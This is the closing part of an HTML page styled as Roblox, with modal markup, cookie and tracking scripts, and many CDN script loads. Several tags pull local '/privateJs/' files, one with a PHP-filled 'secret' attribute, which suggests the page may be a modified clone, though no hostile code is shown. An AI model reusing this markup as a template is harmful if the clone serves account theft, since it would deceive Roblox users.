<div class="Message"></div>
</div>
<div class="ConfirmationModalButtonContainer GenericModalButtonContainer"> <a href id="roblox-confirm-btn"><span></span></a> <a href id="roblox-decline-btn"><span></span></a> </div>
<div class="ConfirmationModalFooter"> </div>
</div>
<script type="text/javascript">
		Roblox = Roblox || {};
		Roblox.Resources = Roblox.Resources || {};
		Roblox.Resources.GenericConfirmation = {
			yes: "Yes",
			No: "No",
			Confirm: "Confirm",
			Cancel: "Cancel"
		};
		</script>
</div>
<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">
<div id="modal-dialog" class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal"> <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span> </button>
<h5 class="modal-title"></h5> </div>
<div class="modal-body">
<div class="modal-top-body">
<div class="modal-message"></div>
<div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays data-no-click> <img class="modal-thumb" alt="generic image" /> </div>
<div class="modal-checkbox checkbox">
<input id="modal-checkbox-input" type="checkbox" />
<label for="modal-checkbox-input"></label>
</div>
</div>
<div class="modal-btns"> <a href id="confirm-btn"><span></span></a> <a href id="decline-btn"><span></span></a> </div>
<div class="loading modal-processing"> <img class="loading-default" src='https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif' alt="Processing..." /> </div>
</div>
<div class="modal-footer text-footer"> </div>
</div>
</div>
</div>
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.jsConsoleEnabled = false;
	</script>
<script type="text/javascript">
	$(function() {
		Roblox.CookieUpgrader.domain = 'roblox.com';
		Roblox.CookieUpgrader.upgrade("GuestData", {
			expires: Roblox.CookieUpgrader.thirtyYearsFromNow
		});
		Roblox.CookieUpgrader.upgrade("RBXSource", {
			expires: function(cookie) {
				return Roblox.CookieUpgrader.getExpirationFromCookieValue("rbx_acquisition_time", cookie);
			}
		});
		Roblox.CookieUpgrader.upgrade("RBXViralAcquisition", {
			expires: function(cookie) {
				return Roblox.CookieUpgrader.getExpirationFromCookieValue("time", cookie);
			}
		});
		Roblox.CookieUpgrader.upgrade("RBXMarketing", {
			expires: Roblox.CookieUpgrader.thirtyYearsFromNow
		});
		Roblox.CookieUpgrader.upgrade("RBXSessionTracker", {
			expires: Roblox.CookieUpgrader.fourHoursFromNow
		});
		Roblox.CookieUpgrader.upgrade("RBXEventTrackerV2", {
			expires: Roblox.CookieUpgrader.thirtyYearsFromNow
		});
	});
	</script>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='intl-polyfill' type='text/javascript' src='https://js.rbxcdn.com/d44520f7da5ec476cfb1704d91bab327.js'></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalCore" data-bundle-source="Main" src="https://js.rbxcdn.com/95044be3ff42e3dc429313faca1316cea62f328a39e29689ffeda9002f3a8bc6.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="TranslationResources" data-bundle-source="Main" src="https://js.rbxcdn.com/83d836a661ff433d5b7ce719c489e43af590ff75ab39ccc6d393546fe91b766a.js"></script>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='leanbase' type='text/javascript' src='https://js.rbxcdn.com/6df275f4290dbf3a38657783651fac4e.js'></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/b8f73eea6b6a8602f787da463c88858dbb1aedeffeb2d07479af47dbda222aae.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreRobloxUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/1908b8b693054886ee53c0b5afed9f78c6aeb45f675a69b6b47363ade3ddcc18.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="React" data-bundle-source="Main" src="https://js.rbxcdn.com/b79589d3dfb2446936aac95605deaa507ce5bc3e09073bac7dd04872880694c2.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/cf340fb618d9a73913b30dfc624ae60d68b9e59723746e6c08d06d14ebdd6dca.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactStyleGuide" data-bundle-source="Main" src="https://js.rbxcdn.com/357eab8c76686d6ca33ec7867f6d9268d3c7e0313532c42d3885c92fe3fc0293.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ConfigureWebApps" data-bundle-source="Main" src="https://js.rbxcdn.com/5259cfe8a3e36118bd61120693dbba3ba87f2c3641f84bb07e29f1d69fe87523.js"></script>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='angular' type='text/javascript' src='https://js.rbxcdn.com/ae3d621886e736e52c97008e085fa286.js'></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="AngularJsUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/c1300ec424eab695a3fd12fcaed2ef4f1365d575cb029ee094254ddbcc3396ff.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalAngularJs" data-bundle-source="Main" src="https://js.rbxcdn.com/90f18784a43a70553e967191b948f70b0193df565f1605762c3c1e245ab4b55a.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Thumbnails" data-bundle-source="Main" src="https://js.rbxcdn.com/5bdcb351422eb9b57b5237886641856149f6c96566bba26e09edd1c130986bfc.js"></script>
<div id="presence-registration-bootstrap-data" data-is-enabled="False" data-interval="15000"></div>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="PresenceRegistration" data-bundle-source="Main" src="https://js.rbxcdn.com/0a83202cf5f2310227e607928f73a26cdaa7d5c27f892b99ef51ec3b863a694d.js"></script>
<div ng-modules="baseTemplateApp">
<script type="text/javascript" src="https://js.rbxcdn.com/ffcc04436179c6b2a6668fdfcfbf62b1.js"></script>
</div>
<div ng-modules="pageTemplateApp">
<script type="text/javascript" src="https://js.rbxcdn.com/3e544c8e724dcdc296258b0ca69401a9.js"></script>
</div>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="VerificationUpsell" data-bundle-source="Main" src="https://js.rbxcdn.com/9eacbe15b40e4ff5e72351887eaf514f2352c6d00d0038d5024dd019e7d7860f.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VerificationUpsell" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f1c993578f9e72da8a554cf8931c293f8020438c236b4c304fb3d527e9e15638.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VerificationUpsell" data-bundle-source="Unknown" src="https://js.rbxcdn.com/8cd6abee4abc62beee3af45eaa3a2894ce41c1d6a02bd6b158d5ea7001127921.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Experimentation" data-bundle-source="Main" src="https://js.rbxcdn.com/c4b0a446b38285f3db5472340f4ef27d737c87b78348e36dc7acbcfec89d70bf.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxBadges" data-bundle-source="Main" src="https://js.rbxcdn.com/68896d2573131793f425731c85898bbac9c88c13ed264c68cd8cc87b1c3545e4.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProfileBadges" data-bundle-source="Unknown" src="https://js.rbxcdn.com/652fb1e29ca15ae17497ec3eb9aa4f4ebc9be9e0f4be6e68e2ff6ef6bf82c535.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProfileBadges" data-bundle-source="Unknown" src="https://js.rbxcdn.com/34bae4c284cebfa0950c4e76dbc64b8ea982260cc4c29ec7e5ab9dfcc37b4a8b.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Navigation" data-bundle-source="Main" src="/privateJs/Navigation.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.AlertsAndOptions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/57d1b7776de993a3bf8ace38e6efd8f8ce5b9a294362c029990f0cf131548531.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.AlertsAndOptions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/385a62cb16e1c8524da81c17728733d79e3ad9ccbc342d982fe79352f8785dba.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ShopDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/95fdafe5af749e388de603b9ee7f67bb092c3c790badc572db4e2bca0c32b49a.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ShopDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c0606e8d6eb4487cdc70d318e6de3d9aaeeb465ddb84acd95139011e56c5e5c6.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c629f6739d6903fec0d935d26a9cea02ff757856d4ed73a83fd1535affea0300.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5370e5e55fc9993ec53b0a4195e82290b8c1c5f95a1fb5cd11a2ec82d5d07809.js"></script>
<script type='text/javascript'>
	Roblox.config.externalResources = [];
	Roblox.config.paths['Pages.Catalog'] = 'https://js.rbxcdn.com/109d883fe3988fca757e26e341ed0fe8.js';
	Roblox.config.paths['Pages.CatalogShared'] = 'https://js.rbxcdn.com/bcba3a83febab35eb41f3a0b8b96db37.js';
	Roblox.config.paths['Widgets.AvatarImage'] = 'https://js.rbxcdn.com/7d49ac94271bd506077acc9d0130eebb.js';
	Roblox.config.paths['Widgets.DropdownMenu'] = 'https://js.rbxcdn.com/da553e6b77b3d79bec37441b5fb317e7.js';
	Roblox.config.paths['Widgets.HierarchicalDropdown'] = 'https://js.rbxcdn.com/4a0af9989732810851e9e12809aeb8ad.js';
	Roblox.config.paths['Widgets.ItemImage'] = 'https://js.rbxcdn.com/61a0490ba23afa17f9ecca2a079a6a57.js';
	Roblox.config.paths['Widgets.PlaceImage'] = 'https://js.rbxcdn.com/a6df74a754523e097cab747621643c98.js';
	</script>
<script>
	$(function() {
		Roblox.DeveloperConsoleWarning.showWarning();
	});
	</script>
<script type="text/javascript">
	$(function() {
		function trackReturns() {
			function dayDiff(d1, d2) {
				return Math.floor((d1 - d2) / 86400000);
			}
			if(!localStorage) {
				return false;
			}
			var cookieName = 'RBXReturn';
			var cookieOptions = {
				expires: 9001
			};
			var cookieStr = localStorage.getItem(cookieName) || "";
			var cookie = {};
			try {
				cookie = JSON.parse(cookieStr);
			} catch(ex) {
				// busted cookie string from old previous version of the code
			}
			try {
				if(typeof cookie.ts === "undefined" || isNaN(new Date(cookie.ts))) {
					localStorage.setItem(cookieName, JSON.stringify({
						ts: new Date().toDateString()
					}));
					return false;
				}
			} catch(ex) {
				return false;
			}
			var daysSinceFirstVisit = dayDiff(new Date(), new Date(cookie.ts));
			if(daysSinceFirstVisit == 1 && typeof cookie.odr === "undefined") {
				RobloxEventManager.triggerEvent('rbx_evt_odr', {});
				cookie.odr = 1;
			}
			if(daysSinceFirstVisit >= 1 && daysSinceFirstVisit <= 7 && typeof cookie.sdr === "undefined") {
				RobloxEventManager.triggerEvent('rbx_evt_sdr', {});
				cookie.sdr = 1;
			}
			try {
				localStorage.setItem(cookieName, JSON.stringify(cookie));
			} catch(ex) {
				return false;
			}
		}
		GoogleListener.init();
		RobloxEventManager.initialize(true);
		RobloxEventManager.triggerEvent('rbx_evt_pageview');
		trackReturns();
		RobloxEventManager._idleInterval = 450000;
		RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_start');
		RobloxEventManager.registerCookieStoreEvent('rbx_evt_ftp');
		RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_success');
		RobloxEventManager.registerCookieStoreEvent('rbx_evt_fmp');
	});
	</script>
<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.UpsellAdModal = Roblox.UpsellAdModal || {};
	Roblox.UpsellAdModal.Resources = {
		title: "Remove Ads Like This",
		body: "Builders Club members do not see external ads like these.",
		accept: "Upgrade Now",
		decline: "No, thanks"
	};
	</script>
<script type="text/javascript" src="/privateJs/Security.js"></script>
<script type="text/javascript" id="Profile" secret="<?=$returnUrl;?>" src="/privateJs/Profile.js"></script>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='page' type='text/javascript' src='/privateJs/PageMain.js'></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="StyleGuide" data-bundle-source="Main" src="https://js.rbxcdn.com/f4943448e16b63aa3eb1c33bdb12cd16e7cf164ded346d9cc2121f5e05f0c219.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CookieBannerV3" data-bundle-source="Main" src="https://js.rbxcdn.com/7693d98990f875a88c91c0385e1b0542bb51913fb34b23f414b6890d90353c40.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Messages" data-bundle-source="Unknown" src="https://js.rbxcdn.com/18dede93de3aac02225e1e6e9957d98d6983c39fc9e76eb0cdb05090e5551f95.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Messages" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5b148ca445e1fd4ef905bc3665b2e29d065ab357cc88fd68be95b519f6e2da0d.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Tracking" data-bundle-source="Unknown" src="https://js.rbxcdn.com/ce6a4105a4d28cac59aa57a3d6615d56ba63526569ebfd88d49ac363d61caddb.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Tracking" data-bundle-source="Unknown" src="https://js.rbxcdn.com/fb47e86d6d7deaf62c7c5c8a62d915361b3f9b47503976e24e4fdd44710a492e.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Footer" data-bundle-source="Main" src="https://js.rbxcdn.com/bffafd994791f59d1efb67723313fc0f59b58fef8dec7cf83535c8f4d1d1ebd9.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Captcha" data-bundle-source="Main" src="https://js.rbxcdn.com/523958ed41b5e1cfecdd3a29a57074d0dd62ff6ba572fefbebc76ff8d48024d5.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CaptchaCore" data-bundle-source="Main" src="https://js.rbxcdn.com/1a6389791b88e1ce869baa0b43e2f423e77141f6913f9d51eeda7d460d53aa97.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Challenge" data-bundle-source="Main" src="https://js.rbxcdn.com/7f87a48c2277d62a95d8de1bb042bad213bb8d1f0a84442a8002c6ef09370d33.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ForceAuthenticator" data-bundle-source="Unknown" src="https://js.rbxcdn.com/8849783a45e85b04232d3a71e9efc2ce8a5d4e0e072bb37740fe2f5acd0ef50a.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ForceAuthenticator" data-bundle-source="Unknown" src="https://js.rbxcdn.com/a5d76f662cc98d13a65d323097497aa93948409caf12b33464400259111e8082.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.TwoStepVerification" data-bundle-source="Unknown" src="https://js.rbxcdn.com/b0449203aa4d09dd98f37745daa567aa84d251e5e8b148f40daaa8169bdde13e.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.TwoStepVerification" data-bundle-source="Unknown" src="https://js.rbxcdn.com/329ba9314a5de7282e8a8035046e7a56faf772d3ffea8af619b3e8854df0fc41.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.SecurityQuestions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/3574cff8a3839614386f61fdf914e02e5217a7878601ce33a9ff41f94a2ad8e3.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.SecurityQuestions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/a054aec7da3a2b719cf38e09c5f6a9f45af54f6e632aa964ccc8b5ec2d83b9b0.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/98b97c4779bb10baadfc8a5a1ae049bba5dd9409be06896754f1446ab2048a60.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f173dcac2f8b211cb232d5295be7540816f52e299ec7086b07f27ddf9ce0a2c9.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Reauthentication" data-bundle-source="Unknown" src="https://js.rbxcdn.com/1057677ca91f349db02f7b279cdfbf25bec8098a13c7870317f7ad4cd4779a97.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Reauthentication" data-bundle-source="Unknown" src="https://js.rbxcdn.com/3241cdd45931acc3efce4b49df4fe9583ed09d79994cc782364a84c4e851af5c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProofOfWorkChallenge" data-bundle-source="Unknown" src="https://js.rbxcdn.com/4963a609b0bb2465ffa6a7ad10bcff85662879d2f342f0cb1a2485320dd81eb5.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProofOfWorkChallenge" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c239c2a4cca7b50a6b45a6c32ee7ddfaa0bba7011c733c6db5aad0f6a7927d54.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CursorPagination" data-bundle-source="Main" src="https://js.rbxcdn.com/267b13d96f317adcd84f99e1b9758d63d612f6e44f7c06b49c6c44c1fa99323f.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="https://js.rbxcdn.com/1e9c21f67e9901f767acd1db03c4a5c6029d4bc0862424e80c746d6e3cf5b99c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5c44d71f75449192684a6558fdffae735d08a0a29e18c656dc0374df397a0050.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="GameBadges" data-bundle-source="Main" src="https://js.rbxcdn.com/834b860d5e724e9d31505254b6ad312a8e8710c7a90600578b26b644451078cd.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameBadges" data-bundle-source="Unknown" src="https://js.rbxcdn.com/25b6012fac851b6de99c569c73c600a0bd0390a3669e530ebca7b42b25807031.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameBadges" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5791d0a166e02bba42ebc7dcc04e9fe103de134b4dcbff8980e8f35686104353.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="SocialLinksJumbotron" data-bundle-source="Main" src="https://js.rbxcdn.com/d982ee6cf2b967586cf9d4416181d6cb45f264fe51e31df6e8714f0a0561552d.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.PromotedChannels" data-bundle-source="Unknown" src="https://js.rbxcdn.com/a9238207bc9ad295084e9a24589d3ea66d8ec4dc1016ad59ba4fa48b3a2aed8a.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.PromotedChannels" data-bundle-source="Unknown" src="https://js.rbxcdn.com/af8cdbaeb57985f23b72f079c67f40debbea47af094dd6051f12b176492c2e09.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ItemPurchase" data-bundle-source="Main" src="https://js.rbxcdn.com/5804331763d8dd8d8fb671924b73023bd1feddd205229569f18413e6f0190f93.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Item" data-bundle-source="Unknown" src="https://js.rbxcdn.com/9cf047a292f5735b2ce9c1896e1951a873acc17e0d794deddde210b8bd91d6d4.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Item" data-bundle-source="Unknown" src="https://js.rbxcdn.com/0eb9f3bc4309642fdf241b8263d8987cbe07add49b9342084cdc23be4e042d93.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Purchasing.PurchaseDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/9f0d42e4c1d1caec59d4fafd16cd31cb945433a50cc63f2a197d9b60d2b7a989.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Purchasing.PurchaseDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/0d3ba3cd162212eb04b26996eda08e542bd0febd250e1e03bba5a932dcb3d84f.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ItemModel" data-bundle-source="Unknown" src="https://js.rbxcdn.com/97b99d5ea1fd09bf3fa4aed595502676b5c6d366675698913916b7b0f1b33a30.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ItemModel" data-bundle-source="Unknown" src="https://js.rbxcdn.com/8f8d451cbe04b730d167b5ce92019da934a5c2da928ca13d9b3eb15cbe2ff5d5.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ServerList" data-bundle-source="Main" src="https://js.rbxcdn.com/08881877fc871f5d4822d3ca9fa78036104752ed1c3253cffe2162da1052590d.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VIPServer" data-bundle-source="Unknown" src="https://js.rbxcdn.com/562a9135abbe798afe4a350ca3e7b750c1b6eeee3b7ff15de8eccd1cc043dfb3.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VIPServer" data-bundle-source="Unknown" src="https://js.rbxcdn.com/71cb0b7eff86334bc8f7289ba6559f93d1e44a49cf56bb2dbdb3582ce11418a6.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ServerList" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f8d6c5c0e0f24c6ba67fde9a947670b525bce012172155058a95721a0fad90f7.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ServerList" data-bundle-source="Unknown" src="https://js.rbxcdn.com/79f5931115427e7a1807c44c950ae1ae3965452891b79131d478bb5277a99cfc.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.PrivateServers" data-bundle-source="Unknown" src="https://js.rbxcdn.com/1b1086c35c478c7f8f8719b34394b844caa7e7464e34b2fe071a1e0e847b7062.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.PrivateServers" data-bundle-source="Unknown" src="https://js.rbxcdn.com/b66d3485edcca6586e97fcc1c519176ce9129277ca982218f507eb6eb0078b92.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="IdVerification" data-bundle-source="Main" src="https://js.rbxcdn.com/de03ec32d530d4845313591fcdf929c0cd82bc2afb9ba47410ad04f4e82b4bb7.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Verification.Identity" data-bundle-source="Unknown" src="https://js.rbxcdn.com/6ca23c4bef0b8c2ee82d1bcf9bb3c52c2d8c6b1c6c69ad40ed2d03d0887335e2.js"></script>
